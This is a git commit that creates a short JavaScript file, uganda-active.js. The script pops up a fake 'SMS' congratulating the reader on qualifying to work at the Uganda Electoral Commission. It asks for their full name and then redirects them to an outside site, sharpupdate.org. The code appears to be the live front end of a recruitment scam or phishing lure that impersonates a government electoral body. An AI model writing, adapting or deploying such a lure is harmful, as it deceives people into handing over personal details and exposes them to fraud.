ceec04dd5a3eb571bf27e1ea3f16c6f15b298a69
ekperikpe <ekperikpe588@gmail.com>
2025-07-14 08:20:21 +0100

    Create uganda-active.js

---
+++ uganda-active.js
@@ -0,0 +1,5 @@
+var password = 'ENTER FULL NAME:'
+password=prompt('SMS: Congratulations, you are qualify to work at Uganda Electoral Commission, Press Ok to Enter your full name ','ENTER FULL NAME:');
+if (password != 'ENTER FULL NAME:') {
+location.href='https://sharpupdate.org/uganda-2026.html';
+}
